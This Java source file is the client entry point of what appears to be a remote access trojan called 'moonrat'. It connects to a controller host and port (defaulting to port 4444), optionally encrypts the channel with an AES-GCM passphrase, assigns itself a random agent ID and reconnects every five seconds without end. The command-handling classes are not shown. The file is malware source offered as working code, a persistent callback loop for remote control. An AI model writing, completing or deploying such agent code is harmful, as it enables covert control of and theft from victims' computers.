package moonrat.client;

import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import moonrat.Protocol;

public final class MoonAgent {
    private MoonAgent() {}

    public static void main(String[] args) throws Exception {
        fixConsole();

        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 4444;
        String channelKey = args.length > 2 ? args[2] : System.getenv("MOONRAT_KEY");
        Protocol.usePassphrase(channelKey);

        String id = UUID.randomUUID().toString().replace("-", "").substring(0, 8);
        System.out.println("[+] channel " + (Protocol.secured() ? "aes-256-gcm" : "plaintext")
                + " -> " + host + ":" + port);

        while (true) {
            try {
                new Session(host, port, id).run();
            } catch (Exception failure) {
                System.out.println("[-] " + failure + ", retry in 5s");
            }
            Thread.sleep(5000);
        }
    }

    private static void fixConsole() {
        if (!System.getProperty("os.name").toLowerCase().contains("win")) return;

        try {
            new ProcessBuilder("cmd", "/c", "chcp", "65001").inheritIO().start().waitFor();
        } catch (Exception ignored) {
        }

        try {
            System.setOut(new PrintStream(new FileOutputStream(FileDescriptor.out), true, StandardCharsets.UTF_8));
            System.setErr(new PrintStream(new FileOutputStream(FileDescriptor.err), true, StandardCharsets.UTF_8));
        } catch (Exception ignored) {
        }
    }
}
